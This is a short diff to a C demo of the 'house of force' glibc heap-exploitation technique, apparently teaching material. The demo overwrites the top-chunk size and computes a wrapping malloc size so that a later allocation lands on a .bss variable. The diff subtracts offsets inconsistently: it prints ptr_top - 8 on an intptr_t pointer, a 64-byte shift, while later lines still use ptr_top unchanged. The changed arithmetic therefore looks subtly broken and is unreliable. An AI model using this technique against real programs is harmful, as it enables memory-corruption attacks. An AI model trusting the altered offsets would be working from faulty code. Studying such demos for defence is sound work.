@@ -43,7 +43,7 @@ int main(int argc , char* argv[])
 
 	//----- VULNERABILITY ----
 	intptr_t *ptr_top = (intptr_t *) ((char *)p1 + real_size);
-	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top);
+	fprintf(stderr, "\nThe top chunk starts at %p\n", ptr_top - 8);
 
 	fprintf(stderr, "\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n");
 	fprintf(stderr, "Old size of top chunk %#llx\n", *((unsigned long long int *)ptr_top));
@@ -55,7 +55,7 @@ int main(int argc , char* argv[])
 	   "Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"
 	   "overflow) and will then be able to allocate a chunk right over the desired region.\n");
 
-	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top;
+	unsigned long evil_size = (unsigned long)bss_var - sizeof(long)*2 - (unsigned long)ptr_top - 8;
 	fprintf(stderr, "\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"
 	   "we will malloc %#lx bytes.\n", bss_var, ptr_top, evil_size);
 	void *new_ptr = malloc(evil_size);
